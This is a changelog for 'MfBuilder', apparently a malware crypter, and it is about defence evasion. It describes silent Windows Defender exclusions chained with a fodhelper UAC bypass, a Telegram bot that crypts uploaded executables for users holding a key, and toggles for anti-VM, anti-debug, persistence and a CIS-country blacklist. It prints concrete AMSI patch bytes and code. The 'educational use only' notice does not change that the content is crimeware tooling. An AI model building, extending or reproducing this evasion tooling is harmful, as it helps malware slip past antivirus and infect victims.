# Changelog

## [Unreleased] - 2025-11-03

### Added - Windows Defender Exclusion (?? NEW!)

#### ??? Silent Windows Defender Evasion
- **Defender Exclusion Module**: Automatically adds executable to Windows Defender exclusions
- **Silent Mode**: When combined with UAC bypass, adds exclusions completely silently!
- **No User Interaction**: No prompts, no windows, completely transparent
- **Dual Exclusions**: Adds both path and process exclusions
- **Graceful Failure**: Silently continues if exclusion fails (no crashes)

**How it works:**
1. UAC bypass elevates to admin (silent via fodhelper.exe)
2. Defender exclusion adds via PowerShell cmdlets
3. Target is now excluded from Windows Defender scanning
4. All without any user prompts or visible windows!

**Configuration:**
- CLI: Set `"defender_exclusion": true` in build.json
- Bot: Toggle option #7 in configuration menu
- Bot shows "?? (Silent with UAC!)" when both UAC and Defender exclusion are enabled

**Files added:**
- `MfRunner/Utilities/DefenderExclusion.cs` - Main implementation
- `DEFENDER_EXCLUSION_INFO.md` - Comprehensive documentation

### Added - Telegram Bot Interface

#### ?? Full Telegram Bot Implementation
- **Authentication System**: Secure key-based authentication before allowing access
- **Interactive Workflow**: 
  - Step 1: User authenticates with key
  - Step 2: Confirms they want to crypt a binary
  - Step 3: Uploads .exe file via Telegram
  - Step 4: Configures crypter options interactively
  - Step 5: Receives crypted binary back
  
- **Binary Detection**: Automatic detection of binary types:
  - Native x86
  - Native x64
  - .NET x86
  - .NET x64

- **Interactive Configuration Menu**: Toggle all features on/off in real-time:
  1. Anti Debug
  2. Anti VM
  3. Blacklist CIS Countries
  4. UAC Bypass
  5. Single Instance
  6. Persistence
  7. Output Format (BAT/EXE)

- **Session Management**: Independent sessions for multiple users
- **Bot Commands**:
  - `/start` - Begin new session
  - `/help` - Show help information
  - `/reset` - Reset current session

- **File Handling**: 
  - Upload validation (only .exe files)
  - Temporary file management with auto-cleanup
  - Send crypted binary back to user

#### ?? New Files
- `src/telegram_bot.rs` - Complete Telegram bot implementation (481 lines)
- `.env.example` - Template for bot token configuration
- `BOT_SETUP.md` - Comprehensive bot setup guide
- `DEPENDENCIES.md` - System dependency installation guide
- `.gitignore` - Protect sensitive files (.env, build artifacts)

### Changed - Enhanced AMSI Bypass (.NET Only!)

#### ??? AMSI Bypass Improvements in `MfRunner/Patches/PatchAMSI.cs`

**Important Note**: AMSI and ETW patches are **ONLY applied for .NET payloads**. Native payloads use indirect syscalls and don't need these patches. This is now clearly documented in the code.

- **New Technique**: Patch at offset +33 instead of function prologue
- **Stealth**: Uses `xor rbx, rbx` (3 bytes: 72, 49, 219) instead of longer patch
- **Memory Protection**: Properly restores PAGE_EXECUTE_READ after patching
- **Evasion**: More difficult to detect than traditional prologue patches

**Before:**
```csharp
byte[] AmsiPatchBytes = new byte[] { 144, 144, 144, 144, 144, 144, 144, 144, 49, 192, 195 }; // 11 bytes
// Patched at function start
```

**After:**
```csharp
byte[] AmsiPatchBytes = new byte[] { 72, 49, 219 }; // 3 bytes (xor rbx, rbx)
IntPtr targetAddress = (IntPtr)((long)AmsiScanBufferAddress + 33); // Offset +33
// Proper memory protection restoration
```

### Modified - Architecture Refactoring

#### ??? Code Structure Changes in `src/main.rs`
- **Dual Mode Support**: Single binary supports both CLI and bot modes
  - CLI mode: `./MfBuilder` (uses build.json)
  - Bot mode: `./MfBuilder --bot` (interactive Telegram)
  
- **Public API**: Exposed `build_with_config()` function for bot integration
- **Type Exports**: Made `SupportedFileExtension` and `MfBuilder` public
- **Async Runtime**: Added Tokio runtime for async Telegram bot operations

#### ?? Dependencies in `Cargo.toml`
Added Telegram bot dependencies:
- `tokio` v1.42.0 with full features (async runtime)
- `teloxide` v0.13 with macros (Telegram bot framework)
- `serde` v1.0 with derive (serialization)
- `log` v0.4 (logging)
- `pretty_env_logger` v0.5 (formatted logs)

### Documentation

#### ?? New Documentation
- **README.md**: Completely rewritten with:
  - New features section
  - Usage modes (bot vs CLI)
  - Configuration options table
  - Project structure overview
  - Security notes
  - Quick start guides

- **BOT_SETUP.md**: Complete bot setup guide including:
  - Creating Telegram bot with BotFather
  - Environment configuration
  - Authentication setup
  - Complete usage flow
  - Example session
  - Troubleshooting
  - Advanced configuration (rate limiting, custom auth)

- **DEPENDENCIES.md**: System dependency installation for all platforms
  - Linux (Ubuntu/Debian/Fedora/Arch)
  - Windows
  - macOS
  - Troubleshooting

### Technical Details

#### ?? Implementation Highlights

**Telegram Bot Architecture:**
- Session-based state management using `Arc<Mutex<HashMap>>`
- Async message handling with teloxide framework
- Document upload/download via Telegram Bot API
- Automatic binary type detection using existing `goblin` integration
- Integration with existing build pipeline via `build_with_config()`

**Security Features:**
- Authentication key validation before any operations
- Temporary file cleanup (auto-removal after build)
- Session isolation between users
- No persistence of user data

**User Experience:**
- Real-time configuration menu updates
- Clear emoji indicators (? ON / ? OFF)
- Step-by-step guided workflow
- Inline help and error messages
- Progress updates during build

### Breaking Changes
None - CLI mode remains fully backward compatible

### Migration Guide

**For Existing Users:**
No changes required for CLI usage. The tool works exactly as before when run without `--bot` flag.

**For Bot Users:**
1. Create Telegram bot via BotFather
2. Copy `.env.example` to `.env`
3. Add your bot token to `.env`
4. Run with `--bot` flag

### Future Enhancements

Potential improvements for consideration:
- [ ] Multi-user authentication with per-user keys
- [ ] Rate limiting to prevent abuse
- [ ] Build queue for handling multiple concurrent requests
- [ ] Statistics and logging dashboard
- [ ] Support for binding additional files via bot
- [ ] Custom output filename selection
- [ ] Build history and retrieval

### Security Notice

?? **Important**: This tool is for educational and authorized testing purposes only.

New security considerations with bot:
- Keep `TELOXIDE_TOKEN` secret
- Use strong authentication keys (change default!)
- Monitor bot usage and logs
- Consider restricting to specific Telegram user IDs
- Be aware of legal implications

### Credits

- AMSI Bypass technique based on: https://github.com/Chainski/GlobalAMSIBypass
- Telegram bot framework: https://github.com/teloxide/teloxide
- UAC bypass: fodhelper.exe technique
- Special thanks to the security research community
